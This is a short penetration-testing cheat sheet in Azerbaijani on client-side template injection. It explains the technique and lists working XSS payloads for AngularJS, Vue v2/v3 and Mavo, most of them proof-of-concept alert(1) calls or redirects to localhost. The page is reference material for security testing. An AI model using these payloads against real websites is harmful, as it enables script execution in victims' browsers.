---
title: Client Side Template Injection (CSTI)
---

Bu, Server Side Template Injection kimidir, lakin müştəridə. CSTI sizə uzaq serverdə kodu icra etməyə icazə verə bilər, CSTI qurbanda ixtiyari JavaScript kodunu icra etməyə icazə verə bilər.

Bu zəifliyi yoxlamaq üsulu CSTI vəziyyətində olduğu kimi çox oxşardır, interpreter ikiqat düymələr arasında nəyinsə yerinə yetirilməsini gözləyəcək və onu icra edəcək. Məsələn, _\{\{ 7-7 \}\}_ kimi bir şey istifadə edərək, əgər server həssasdırsa, 0, yoxsa, orijinalı görəcəksiniz: _\{\{ 7-7 \}\}_

### AngularJS

AngularJS, _ng-app_ atributunu (həmçinin AngularJS direktivi kimi tanınır) ehtiva edən HTML qovşaqlarının məzmununu skan edən məşhur JavaScript kitabxanasıdır. HTML koduna direktiv əlavə edildikdə, siz JavaScript ifadələrini ikiqat əyri mötərizə içərisində icra edə bilərsiniz.

Məsələn, əgər daxiletməniz HTML-nin gövdəsində əks olunursa və gövdə ng-app ilə müəyyən edilirsə: _\<body ng-app\>_

Siz gövdəyə əlavə edilən əyri mötərizələrdən istifadə edərək ixtiyari JavaScript kodunu icra edə bilərsiniz:

```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>
<!-- Google Research - AngularJS -->
```

```html
<div ng-app ng-csp>
  <textarea
    autofocus
    ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"
  ></textarea>
</div>
```

### VueJS

```html
<!-- Google Research - Vue.js-->
">
<div
  v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"
>
  aaa
</div>
```

### V3

```javascript
{
  {
    _openBlock.constructor("alert(1)")();
  }
}
```

### V2

```javascript
{
  {
    constructor.constructor("alert(1)")();
  }
}
```

### Mavo

```html
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
